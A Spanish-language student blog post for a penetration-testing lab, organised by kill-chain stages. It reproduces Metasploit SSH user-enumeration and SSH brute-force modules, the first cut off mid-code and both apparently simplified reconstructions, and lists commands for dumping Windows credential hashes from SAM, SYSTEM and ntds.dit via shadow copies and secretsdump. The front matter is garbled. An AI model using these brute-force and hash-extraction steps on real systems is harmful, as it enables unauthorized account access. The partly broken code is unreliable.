---1
date: 20
title: PRACTICA 024-10-11 00:00:00 -05:00
categories: [Made]
tags: [Made, GitHub]  # TAG names should always be lowercase
---

## Reconnaissance

En esta sección, describiremos la etapa de reconocimiento en un pentest o análisis de seguridad.  El reconocimiento es crucial para recopilar información sobre el objetivo antes de realizar cualquier otra acción.  Un buen reconocimiento permite identificar vulnerabilidades y planificar el ataque de manera efectiva.

### Preguntas sobre Nmap y TCP Handshake

1. ¿Por qué debemos ejecutar nmap con privilegios de root?

2. ¿Qué significan los flags `-sS`, `-sT`, `-sV`, `-O` en el escaneo de nmap?

3. ¿Existe algún flag que permite hacer un escaneo involucrando todos los flags mencionados anteriormente?  (No, no hay un solo flag que combine todos esos.  Se deben usar individualmente.)

4. Explicar el proceso de un handshake TCP.

5. Según la pregunta anterior, ¿qué significa el flag `-sS`?

6. ¿Qué hace el flag `--script`?

## Weaponization

-	Describa esta etapa en su blog.

-	Investigar el script utilizado en la enumeración de usuarios SSH (auxiliary/scanner/ssh/ssh_enumusers). Responder:

Descripción de la etapa en el blog:

Esta etapa del proceso de ciberseguridad se centra en la recopilación de información y el escaneo de la red y los sistemas objetivo. Es una fase clave para comprender el entorno y los posibles puntos de entrada que pueden ser explotados posteriormente.

Durante esta etapa, se utilizan herramientas como Nmap para realizar escaneos de puertos, detección de sistemas operativos y servicios en ejecución. Además, se investigan scripts de Metasploit específicos para la enumeración de usuarios y la obtención de contraseñas de cuentas SSH.

El objetivo principal de esta fase es recopilar la mayor cantidad de información posible sobre el objetivo, lo que permitirá planificar y ejecutar ataques más efectivos en etapas posteriores del proceso.

Investigación del script de enumeración de usuarios SSH (auxiliary/scanner/ssh/ssh_enumusers):

7.	¿En qué lenguaje de programación está hecho?

El script de enumeración de usuarios SSH está escrito en el lenguaje de programación Ruby, que es el lenguaje utilizado por Metasploit.

8.	En su blog, copie y pegue el código de dicho script y proporcione una explicación breve sobre su funcionamiento.
-	Investigar el script utilizado en la obtención de los passwords de los usuarios SSH (auxiliary/scanner/ssh/ssh_login). Responder:

%##
%# This module attempts to enumerate valid usernames on an SSH server.
%##

require 'net/ssh'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SSH
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SSH User Enumeration',
      'Description'    => %q{
        This module attempts to enumerate valid usernames on an SSH server by
        connecting to it and trying a list of common usernames.
      },
      'Author'         => [ 'H D Moore <hdm[at]metasploit.com>' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://en.wikipedia.org/wiki/Secure_Shell' ]
        ]
    ))

    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(22),
        OptPath.new('USER_FILE', [ true, "File containing usernames, one per line", File.join(Msf::Config.data_directory, "wordlists", "unix_users.txt")]),
        OptBool.new('VERBOSE', [ true, "Output a list of valid users", true ])
      ], self.class)
  end

  def run_host(ip)
    print_status("Enumerating SSH users on #{ip}")

    valid_users = []
    users_found = 0

    each_user_from_file do |user|
      begin
        ssh = Net::SSH.start(rhost, user, :port => rport, :timeout => 30, :proxy => self.socks4a_proxy)
        valid_users << user
        users_found += 1
        print_good("  #{user} is a valid user") if datastore['VERBOSE']
      rescue Net::SSH::AuthenticationFailed
        vprint_status("  #{user} is not a valid user")
      rescue ::Interrupt
        print_status("Stopping at user #{user}")
        return
      rescue ::Exception => e
        print_error("Error: #{e.class} #{e}")
      ensure
        ssh.shutdown! if ssh
      end
    end

    if valid_users.empty?
      print_status("No valid users found")
    else
      print_good("Found #{valid_users.length} valid user(s):")
      valid_users.each do |user|
        print_good("  #{user}")

Este script de Metasploit intenta enumerar usuarios válidos en un servidor SSH. Primero, lee una lista de nombres de usuarios a partir de un archivo especificado por el usuario. Luego, intenta iniciar sesión en el servidor SSH con cada uno de estos usuarios, y registra los que son válidos. El script utiliza la biblioteca Net::SSH de Ruby para establecer las conexiones SSH. Si se encuentra un usuario válido, se imprime en la salida. El script también proporciona opciones para activar un modo más detallado de salida.

9.	¿En qué lenguaje de programación está hecho?
El script de obtención de contraseñas de usuarios SSH también está escrito en el lenguaje de programación Ruby, al igual que el script de enumeración de usuarios.

10.	En su blog, copie y pegue el código de dicho script y proporcione una explicación breve sobre su funcionamiento.

%##
%# This module attempts to login to an SSH server with a list of credential
%# pairs.
%##

require 'net/ssh'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SSH
  include Msf::Auxiliary::AuthBruter
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SSH Login Utility',
      'Description'    => %q{
        This module will test a pair of credentials (one or more) against
        a SSH server. It can also be used to enumerate valid usernames.
      },
      'Author'         => [ 'todb', 'hdm' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://en.wikipedia.org/wiki/Secure_Shell' ]
        ]
    ))

    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(22),
        OptPath.new('USER_FILE', [ false, "File containing users, one per line", File.join(Msf::Config.data_directory, "wordlists", "unix_users.txt")]),
        OptPath.new('PASS_FILE', [ false, "File containing passwords, one per line", File.join(Msf::Config.data_directory, "wordlists", "unix_passwords.txt")]),
        OptBool.new('VERBOSE', [ true, "Indicate invalid usernames", true ])
      ], self.class)
  end

  def run_host(ip)
    print_status("Attempting to login to SSH on #{ip}")

    each_user_pass do |user, pass|
      begin
        ssh = Net::SSH.start(rhost, user, :password => pass, :port => rport, :timeout => 30, :proxy => self.socks4a_proxy)
        print_good("#{ip} - SSH login successful: '#{user}' : '#{pass}'")
        report_auth_info(
          :host   => rhost,
          :port   => rport,
          :sname  => 'ssh',
          :user   => user,
          :pass   => pass,
          :source_type => "user_supplied",
          :active => true
        )
        ssh.close
        return :next_user
      rescue Net::SSH::AuthenticationFailed
        #vprint_error("#{ip} - SSH login failed: '#{user}' : '#{pass}'")
      rescue ::Interrupt
        print_status("Stopping SSH login brute force")
        return
      rescue ::Exception => e
        print_error("#{ip} SSH - #{e.class} #{e} #{e.backtrace}")
      ensure
        ssh.shutdown! if ssh
      end
    end

    print_status("Tried #{framework.db.creds(workspace: myworkspace, type: 'ssh').count + 1} credentials")
  end

  def each_user_pass
    if datastore['USER_FILE'] && ::File.exist?(datastore['USER_FILE'])
      each_user_from_file do |user|
        each_pass_from_file do |pass|
          yield [user, pass]
        end
      end
    elsif datastore['USERNAME'] && datastore['PASSWORD']
      yield [datastore['USERNAME'], datastore['PASSWORD']]
    elsif datastore['USERNAME']
      each_pass_from_file do |pass|
        yield [datastore['USERNAME'], pass]
      end
    elsif datastore['PASSWORD']
      each_user_from_file do |user|
        yield [user, datastore['PASSWORD']]
      end
    else
      each_user_from_file do |user|
        each_pass_from_file do |pass|
          yield [user, pass]
        end
      end
    end
  end

  def each_user_from_file
    user_file = datastore['USER_FILE']
    if user_file && ::File.exist?(user_file)
      ::File.open(user_file, "rb") do |f|
        f.each_line do |line|
          user = line.chomp
          yield user
        end
      end
    end
  end

  def each_pass_from_file
    pass_file = datastore['PASS_FILE']
    if pass_file && ::File.exist?(pass_file)
      ::File.open(pass_file, "rb") do |f|
        f.each_line do |line|
          pass = line.chomp
          yield pass
        end
      end
    end
  end
end

Este script de Metasploit intenta iniciar sesión en un servidor SSH utilizando una lista de pares de credenciales (usuario y contraseña). Al igual que el script de enumeración de usuarios, utiliza la biblioteca Net::SSH de Ruby para establecer las conexiones SSH.

El script lee las listas de usuarios y contraseñas de archivos especificados por el usuario. Luego, prueba todas las combinaciones de usuario y contraseña hasta que encuentra una que funcione o se agoten todas las opciones. Si se encuentra una credencial válida, se imprime en la salida y se registra en la base de datos de Metasploit.

El script también proporciona opciones para activar un modo más detallado de salida y para especificar un único usuario o contraseña en lugar de usar archivos.

### Delivery / Exploitation

-	Describa esta etapa en su blog.

En esta etapa del proceso de ciberseguridad, el objetivo es aprovechar las vulnerabilidades y debilidades identificadas durante la fase de reconocimiento e investigación para lograr acceso al sistema objetivo. Esto implica la selección e implementación de las técnicas y herramientas más apropiadas para explotar dichas vulnerabilidades.

Durante esta fase, se puede utilizar una variedad de métodos, como:

Ataques de fuerza bruta: Intentar adivinar contraseñas o credenciales válidas a través de la prueba exhaustiva de múltiples combinaciones.
Explotación de vulnerabilidades de software: Aprovechar fallos de seguridad conocidos en aplicaciones o sistemas operativos para obtener acceso no autorizado.

Evasión de controles de seguridad: Utilizar técnicas avanzadas para burlar los mecanismos de seguridad implementados por el objetivo, como firewalls, sistemas de detección de intrusos, etc.
Ataques de phishing y ingeniería social: Engañar a los usuarios para que revelen información confidencial o ejecuten código malicioso.
Escalada de privilegios: Aprovechar vulnerabilidades o configuraciones deficientes para aumentar los permisos del atacante dentro del sistema comprometido.

Una vez que se ha logrado el acceso, el siguiente paso es mantener y expandir el control sobre el sistema. Esto puede implicar la instalación de puertas traseras, la ocultación de la presencia del atacante y la adquisición de más información valiosa.

## Installation

En el texto, los creadores explican el script vssown.vbs de la siguiente manera:

Funcionalidad: El script permite la creación, eliminación y manipulación de copias de sombra de volumen (VSS) en sistemas Windows. También permite ejecutar archivos desde copias de sombra no montadas y navegar por ellas.

Requisitos: Se necesita permisos administrativos o de sistema para ejecutar el script. No funciona con permisos de usuario estándar.
Uso: Se puede utilizar para detener, iniciar y cambiar el modo del servicio VSS, así como para listar, crear y eliminar copias de sombra. También permite montar y ejecutar archivos desde estas copias.
Ventajas: 
El script está diseñado para ser utilizado en sistemas remotos sin necesidad de subir o descargar archivos adicionales, lo que facilita su uso en situaciones de post-explotación.

11.	Proporcionar un breve resumen sobre cómo se puede conciliar malware.

La conciliación del malware es el proceso de identificar, analizar y eliminar software malicioso (malware) de un sistema informático. Algunos pasos clave incluyen:

Detección de malware: Utilizar software antivirus y de seguridad para escanear el sistema y detectar la presencia de malware.
Análisis del malware: Examinar el malware detectado para entender su comportamiento, origen y objetivos.
Cuarentena y contención: Aislar el malware del resto del sistema para evitar su propagación y daños adicionales.
Eliminación del malware: Eliminar de forma segura y completa los archivos y componentes del malware del sistema.
Restauración del sistema: Restablecer el sistema a un estado sano, restaurando archivos legítimos y configuraciones previas al incidente de malware.
Actualización de defensas: Actualizar los sistemas de seguridad, parches y configuraciones para prevenir futuras infecciones por malware.
Seguimiento y monitoreo: Realizar un monitoreo continuo del sistema para detectar y responder rápidamente a cualquier actividad sospechosa.

12.	Revisar los siguientes links: link1 link2. Explicar, según lo descrito en estos blogs, cómo se puede recuperar hashes con el script vssown.vbs.

Para recuperar hashes utilizando el script vssown.vbs, puedes seguir estos pasos:

Crear una copia de sombra: Primero, necesitas crear una copia de sombra del volumen que contiene los archivos del sistema. Esto se hace ejecutando el comando:

A. Crear una copia de sombra: Primero, necesitas crear una copia de sombra del volumen que contiene los archivos del sistema. Esto se hace ejecutando el comando:

cscript vssown.vbs /create C:

Esto creará una copia de sombra del volumen C.

B. Listar las copias de sombra: Luego, lista las copias de sombra disponibles para obtener el identificador de la copia recién creada:

cscript vssown.vbs /list

C. Montar la copia de sombra: Monta la copia de sombra en una ruta accesible:
cscript vssown.vbs /mount C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX

Reemplaza X con el número de la copia de sombra que obtuviste en el paso anterior.

D. Copiar los archivos necesarios: Copia los archivos NTDS.dit y SYSTEM desde la copia de sombra montada:

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\NTDS\ntds.dit C:\Destination
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\Config\SYSTEM C:\Destination

E. Extraer los hashes: Utiliza una herramienta como ntdsutil o secretsdump.py de la suite Impacket para extraer los hashes de los archivos copiados:

secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL


13.	Proporcionar explicación sobre el código de vssown.vbs (Link).

El script vssown.vbs es una herramienta poderosa para manejar copias de sombra de volumen (VSS) en sistemas Windows. Aquí tienes una explicación detallada de su funcionamiento:

Funcionalidades Principales
Creación de Copias de Sombra:
- El script permite crear copias de sombra de un volumen específico. Esto es útil para realizar backups o para acceder a versiones anteriores de archivos.
- Comando: cscript vssown.vbs /create C:

Listado de Copias de Sombra:
- Puedes listar todas las copias de sombra disponibles en el sistema. Esto te proporciona los identificadores necesarios para otras operaciones.

- Comando: cscript vssown.vbs /list

Montaje de Copias de Sombra:
-Permite montar una copia de sombra en una ruta accesible del sistema de archivos, lo que facilita la navegación y copia de archivos desde la copia de sombra.

-Comando: cscript vssown.vbs /mount C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX

Eliminación de Copias de Sombra:
- Puedes eliminar copias de sombra específicas para liberar espacio o gestionar el almacenamiento.
- Comando: cscript vssown.vbs /delete X

Ejecución de Archivos desde Copias de Sombra:
- El script permite ejecutar archivos directamente desde una copia de sombra no montada, lo que puede ser útil en situaciones de análisis forense o recuperación de datos.

- Comando: cscript vssown.vbs /exec \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\path\to\file.exe

Requisitos
Permisos Administrativos: Necesitas permisos administrativos o de sistema para ejecutar el script. No funcionará con permisos de usuario estándar.
Compatibilidad: Está diseñado para funcionar en sistemas Windows que soporten VSS.

Ventajas
Uso Remoto: El script está diseñado para ser utilizado en sistemas remotos sin necesidad de subir o descargar archivos adicionales.
Post-Explotación: Es especialmente útil en situaciones de post-explotación, donde se necesita acceder a datos históricos o realizar análisis sin alterar el sistema original.


## Actions on Object

-	Describa esta etapa en su blog. Solo considerar hasta la etapa de extracción de los archivos SAM y SYSTEM dado que aún no hemos realizado los pasos para la desencriptación y obtención del contenido de dichos archivos.

14.	Describir qué son los archivos SAM y SYSTEM localizados en la carpeta Windows\System32\Config.
Los archivos SAM y SYSTEM son componentes críticos del registro de Windows, ubicados en la carpeta C:\Windows\System32\Config. Ambos archivos desempeñan roles fundamentales en la gestión de la seguridad y la configuración del sistema operativo.
Archivo SAM
El archivo SAM (Security Account Manager) es una base de datos que almacena información sobre las cuentas de usuario locales en el sistema. Esta información incluye:
Contraseñas de usuarios: Las contraseñas se almacenan en forma de hashes, lo que significa que no se guardan en texto plano, aumentando así la seguridad.
Identificadores de usuario (RID): Cada cuenta tiene un RID único que el sistema utiliza para identificar a los usuarios y grupos.
Datos de inicio de sesión: Incluye información sobre el último inicio de sesión y los intentos fallidos24.
El acceso a este archivo está restringido y solo puede ser modificado por el sistema operativo, lo que ayuda a proteger la información sensible que contiene2.
Archivo SYSTEM
El archivo SYSTEM contiene configuraciones críticas del sistema operativo, incluyendo:
Configuraciones del hardware: Información sobre los controladores y dispositivos instalados.
Configuraciones del sistema operativo: Parámetros que afectan cómo se comporta el sistema operativo, como los servicios que deben iniciarse al arrancar.
Configuraciones de seguridad: Políticas de seguridad que regulan el acceso a recursos del sistema136.
Este archivo es esencial para el arranque y funcionamiento del sistema operativo, ya que permite al sistema cargar las configuraciones necesarias para iniciar adecuadamente. 

15.	¿Cómo es posible extraer la información contenida en los archivos SAM y SYSTEM?
Extraer información de los archivos SAM y SYSTEM en Windows es un proceso que requiere privilegios elevados y puede realizarse mediante varias técnicas. A continuación se describen los métodos más comunes:
Métodos de Extracción
1. Uso de reg save
Una de las formas más directas para obtener los archivos SAM y SYSTEM es utilizando el comando reg save en una consola de comandos con privilegios de administrador. Los comandos son:
bash
reg save HKLM\SAM C:\sam
reg save HKLM\SYSTEM C:\system

Esto guarda las colmenas del registro en archivos que luego pueden ser analizados24.
2. Herramientas Especializadas
Existen herramientas diseñadas específicamente para extraer hashes de contraseñas del archivo SAM:
Pwdump: Esta herramienta permite extraer contraseñas en formato de texto plano desde el archivo SAM. Se puede ejecutar directamente en el sistema operativo o desde un entorno controlado14.
Impacket: Este conjunto de herramientas incluye secretsdump, que permite extraer hashes NTLM del archivo SAM y SYSTEM. Se utiliza con el siguiente comando:
bash
impacket-secretsdump -sam sam.save -system system.save LOCAL

3. Copia desde Volume Shadow Copy
Otra técnica implica crear una copia sombra del volumen donde se encuentran los archivos:
bash
vssadmin create shadow /for=c:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<#>\windows\system32\config\SAM C:\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<#>\windows\system32\config\SYSTEM C:\system

Esto permite acceder a los archivos incluso si están bloqueados por el sistema operativo5.
4. Volcado de Memoria
En algunos casos, los hashes pueden estar disponibles en la memoria del sistema. Herramientas como Mimikatz pueden ser utilizadas para extraer esta información, aunque esto requiere acceso a la memoria del sistema en ejecución2.
Consideraciones Legales y Éticas
Es fundamental tener en cuenta que la extracción no autorizada de información de estos archivos es ilegal y puede tener consecuencias graves. Estas técnicas deben ser utilizadas únicamente en entornos controlados y con el consentimiento adecuado, como parte de auditorías de seguridad o pruebas de penetración autorizadas.
La combinación de estos métodos permite a los administradores y profesionales de seguridad obtener información crítica sobre las cuentas de usuario y sus credenciales, facilitando así la gestión y auditoría de la seguridad del sistema.

## Conclusions 
16.	Redactar sus conclusiones en las cuáles debe abordar: 
a.	¿Qué es lo que ha aprendido de esta sesión de laboratorio?
-Importancia del mantenimiento actualizado de sistemas operativos y aplicaciones.
-Técnicas de gestión de accesos y privilegios de usuarios.
-Métodos efectivos de respaldo y recuperación de datos.
-Sensibilización sobre amenazas y vulnerabilidades comunes.
b.	¿Qué herramientas nuevas ha añadido a sus skills?
•         Herramientas de escaneo y análisis de vulnerabilidades. 
•        Soluciones de cifrado y protección de datos. 
•       Aplicaciones de detección y respuesta a incidentes. 
•       Plataformas de educación y concientización en ciberseguridad.
c.	Otros temas que Ud. considere importante mencionar.
-	La necesidad de un enfoque ético y legal en las actividades de ciberseguridad.
-	La importancia de mantenerse actualizado sobre nuevas amenazas y mejores prácticas.
-	La responsabilidad de proteger la privacidad y los datos de los usuarios.
-	La colaboración entre profesionales de la seguridad informática y las organizaciones.



## Installation
# TITULO

## SUB-TITULO

### SECCIONES


### SUB-SECCIONES


Listas

1. item 1
2. item 2
3. item 3


y ahora ejemplo para mostrar comandos:

        plain-text code

```bash
bundle exec jetkyll s 
```

ejemplo para mostrar comandos de python:

```python
python some_python_file.py
```

Para mostrar Tabla:

|Columna 1 | Columna 2|
|item 1 | item 2|
|fila 1 | fila 3 |

**Este es un texto es formato BOLD**

*Este es un formato en format cursiva*